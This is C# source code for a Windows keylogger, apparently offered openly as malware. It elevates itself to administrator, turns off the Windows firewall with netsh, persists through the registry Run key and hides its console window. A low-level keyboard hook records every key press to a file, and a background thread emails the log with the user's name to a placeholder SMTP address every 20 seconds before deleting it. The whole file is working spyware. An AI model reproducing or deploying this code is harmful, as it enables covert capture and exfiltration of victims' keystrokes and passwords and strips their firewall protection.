using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Windows.Forms;

using System.Security.Principal;
using System.Net;
using System.Net.Mail;

using System.Threading;

using Microsoft.Win32;

namespace keylogger
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13; // povolí monitorovat vstupy z klávesnice
        private const int WM_KEYDOWN = 0x0100; // stisknutí nesystémové klávesy (není stisknuta klávesa ALT)
        private static LowLevelKeyboardProc _proc = HookCallback; // zavolá se pokaždé, když se stiskne klávesa
        private static IntPtr _hookID = IntPtr.Zero;

        public static void Main()
        {
            // run app as admin
            if (!Program.IsAdministrator())
            {
                var exeName = Process.GetCurrentProcess().MainModule.FileName;
                ProcessStartInfo startInfo = new ProcessStartInfo(exeName);
                startInfo.Verb = "runas";
                startInfo.Arguments = "restart";
                Process.Start(startInfo);
                Application.Exit();
            }

            // turn off firewall true - off, false - on
            TurnOffFirewall(true);

            // auto startup
            AutoRun();

            // thread for sending data
            var t = new Thread(() => sendEmail(20000));
            t.Start();

            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); // hide window

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.Write((Keys)vkCode);
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // load standard Windows components...
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        // window hiding...
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        // send email
        private static void sendEmail(int delayMs)
        {
            while (true)
            {
                Thread.Sleep(delayMs);
                Console.WriteLine("send email");
                try
                {
                    String path = Application.StartupPath + @"\log.txt";

                    MailMessage mail = new MailMessage();
                    SmtpClient server = new SmtpClient("smtp.server.com");

                    mail.From = new MailAddress("emailFrom@server.com");
                    mail.To.Add("emailTo@server.com");
                    mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name;

                    if (!File.Exists(path))
                        return;

                    StreamReader r = new StreamReader(path);
                    String content = r.ReadLine();
                    r.Close();
                    File.Delete(path);
                    mail.Body = content;

                    server.Port = 587;
                    server.Credentials = new NetworkCredential("emailFrom@server.com", "password");
                    server.EnableSsl = true;
                    server.Send(mail);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }
        }

        private static void AutoRun()
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.DeleteValue(Application.ProductName, false);

            if (key.GetValue(Application.ProductName) == null)
            {
                key.SetValue(Application.ProductName, Application.ExecutablePath);
            }
            else
            {
                if (!key.GetValue(Application.ProductName).Equals(Application.ExecutablePath))
                {
                    key.SetValue(Application.ProductName, Application.ExecutablePath);
                }
            }
        }

        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void TurnOffFirewall(bool status)
        {
            Process process = new Process
            {
                StartInfo = {
                    Verb = "runas",
                    FileName = "netsh",
                    Arguments = "advfirewall set allprofiles state " + ((status) ? "off" : "on"),
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true
                }
            };
            process.Start();
            process.WaitForExit();
        }
    }
}
